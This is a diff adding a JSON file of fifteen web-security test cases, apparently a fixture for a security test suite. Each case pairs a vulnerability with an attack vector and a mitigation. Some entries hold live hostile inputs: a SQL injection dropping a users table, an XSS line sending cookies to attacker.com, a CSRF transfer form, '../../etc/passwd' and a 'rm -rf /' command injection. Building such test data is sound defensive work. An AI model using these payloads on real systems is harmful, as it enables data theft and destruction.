@@ -1,0 +1,218 @@
+[
+  {
+    "id": "security_001",
+    "category": "injection_attacks",
+    "description": "SQL injection through user input",
+    "attack_vector": {
+      "input_field": "username",
+      "malicious_input": "admin'; DROP TABLE users; --",
+      "vulnerable_query": "SELECT * FROM users WHERE username = '{input}'"
+    },
+    "expected_behavior": "Input sanitization and parameterized queries",
+    "vulnerability_type": "sql_injection",
+    "severity": "critical",
+    "mitigation": "prepared_statements_and_input_validation"
+  },
+  {
+    "id": "security_002",
+    "category": "cross_site_scripting",
+    "description": "XSS attack through user-generated content",
+    "attack_vector": {
+      "input_field": "comment",
+      "malicious_input": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+      "context": "user_comment_display"
+    },
+    "expected_behavior": "HTML sanitization and CSP headers",
+    "vulnerability_type": "xss",
+    "severity": "high",
+    "mitigation": "output_encoding_and_csp"
+  },
+  {
+    "id": "security_003",
+    "category": "authentication_bypass",
+    "description": "Authentication bypass through parameter manipulation",
+    "attack_vector": {
+      "method": "parameter_pollution",
+      "payload": "user=admin&user=guest",
+      "vulnerable_logic": "first_parameter_only_check"
+    },
+    "expected_behavior": "Robust authentication validation",
+    "vulnerability_type": "auth_bypass",
+    "severity": "critical",
+    "mitigation": "comprehensive_parameter_validation"
+  },
+  {
+    "id": "security_004",
+    "category": "privilege_escalation",
+    "description": "Horizontal privilege escalation",
+    "attack_vector": {
+      "method": "direct_object_reference",
+      "url": "/api/user/123/profile",
+      "manipulation": "/api/user/456/profile",
+      "access_control": "insufficient"
+    },
+    "expected_behavior": "Proper authorization checks",
+    "vulnerability_type": "privilege_escalation",
+    "severity": "high",
+    "mitigation": "object_level_authorization"
+  },
+  {
+    "id": "security_005",
+    "category": "session_hijacking",
+    "description": "Session token theft and reuse",
+    "attack_vector": {
+      "method": "session_fixation",
+      "scenario": "attacker_sets_session_id",
+      "victim_action": "logs_in_with_fixed_session",
+      "result": "attacker_gains_access"
+    },
+    "expected_behavior": "Session regeneration and secure cookies",
+    "vulnerability_type": "session_hijacking",
+    "severity": "high",
+    "mitigation": "session_regeneration_and_secure_flags"
+  },
+  {
+    "id": "security_006",
+    "category": "csrf_attack",
+    "description": "Cross-Site Request Forgery",
+    "attack_vector": {
+      "method": "malicious_form_submission",
+      "payload": "<form action='https://bank.com/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'></form>",
+      "trigger": "auto_submit_on_page_load"
+    },
+    "expected_behavior": "CSRF token validation",
+    "vulnerability_type": "csrf",
+    "severity": "medium",
+    "mitigation": "csrf_tokens_and_same_site_cookies"
+  },
+  {
+    "id": "security_007",
+    "category": "directory_traversal",
+    "description": "Path traversal to access unauthorized files",
+    "attack_vector": {
+      "parameter": "filename",
+      "malicious_input": "../../etc/passwd",
+      "vulnerable_code": "open(user_input)"
+    },
+    "expected_behavior": "Path validation and sandboxing",
+    "vulnerability_type": "directory_traversal",
+    "severity": "high",
+    "mitigation": "path_canonicalization_and_whitelist"
+  },
+  {
+    "id": "security_008",
+    "category": "command_injection",
+    "description": "OS command injection through user input",
+    "attack_vector": {
+      "parameter": "filename",
+      "malicious_input": "file.txt; rm -rf /",
+      "vulnerable_code": "system('cat ' + user_input)"
+    },
+    "expected_behavior": "Input validation and safe APIs",
+    "vulnerability_type": "command_injection",
+    "severity": "critical",
+    "mitigation": "parameterized_commands_and_validation"
+  },
+  {
+    "id": "security_009",
+    "category": "insecure_deserialization",
+    "description": "Unsafe deserialization of user data",
+    "attack_vector": {
+      "method": "malicious_serialized_object",
+      "payload": "crafted_object_with_malicious_code",
+      "execution": "automatic_on_deserialization"
+    },
+    "expected_behavior": "Safe deserialization practices",
+    "vulnerability_type": "insecure_deserialization",
+    "severity": "critical",
+    "mitigation": "whitelist_classes_and_validation"
+  },
+  {
+    "id": "security_010",
+    "category": "weak_cryptography",
+    "description": "Use of weak cryptographic algorithms",
+    "attack_vector": {
+      "algorithm": "MD5",
+      "usage": "password_hashing",
+      "weakness": "collision_attacks_and_rainbow_tables"
+    },
+    "expected_behavior": "Strong cryptographic standards",
+    "vulnerability_type": "weak_crypto",
+    "severity": "medium",
+    "mitigation": "bcrypt_or_argon2_for_passwords"
+  },
+  {
+    "id": "security_011",
+    "category": "information_disclosure",
+    "description": "Sensitive information in error messages",
+    "attack_vector": {
+      "trigger": "invalid_database_query",
+      "error_message": "MySQL Error: Table 'users' doesn't exist in database 'production_db'",
+      "disclosed_info": "database_structure_and_names"
+    },
+    "expected_behavior": "Generic error messages for users",
+    "vulnerability_type": "information_disclosure",
+    "severity": "low",
+    "mitigation": "custom_error_pages_and_logging"
+  },
+  {
+    "id": "security_012",
+    "category": "broken_access_control",
+    "description": "Missing function-level access control",
+    "attack_vector": {
+      "method": "direct_url_access",
+      "url": "/admin/delete_user",
+      "user_role": "regular_user",
+      "access_control": "client_side_only"
+    },
+    "expected_behavior": "Server-side authorization checks",
+    "vulnerability_type": "broken_access_control",
+    "severity": "high",
+    "mitigation": "server_side_authorization_enforcement"
+  },
+  {
+    "id": "security_013",
+    "category": "security_misconfiguration",
+    "description": "Default credentials and configurations",
+    "attack_vector": {
+      "service": "database_admin_panel",
+      "credentials": "admin/admin",
+      "configuration": "default_installation",
+      "exposure": "internet_accessible"
+    },
+    "expected_behavior": "Secure default configurations",
+    "vulnerability_type": "security_misconfiguration",
+    "severity": "high",
+    "mitigation": "change_defaults_and_harden_configuration"
+  },
+  {
+    "id": "security_014",
+    "category": "insufficient_logging",
+    "description": "Lack of security event logging",
+    "attack_vector": {
+      "attack_type": "brute_force_login",
+      "attempts": 1000,
+      "logging": "none",
+      "detection": "impossible"
+    },
+    "expected_behavior": "Comprehensive security logging",
+    "vulnerability_type": "insufficient_logging",
+    "severity": "medium",
+    "mitigation": "security_event_logging_and_monitoring"
+  },
+  {
+    "id": "security_015",
+    "category": "api_security",
+    "description": "Insecure API endpoint without rate limiting",
+    "attack_vector": {
+      "endpoint": "/api/search",
+      "attack": "automated_enumeration",
+      "rate_limiting": "none",
+      "impact": "data_harvesting"
+    },
+    "expected_behavior": "API rate limiting and authentication",
+    "vulnerability_type": "api_abuse",
+    "severity": "medium",
+    "mitigation": "rate_limiting_and_api_keys"
+  }
+]
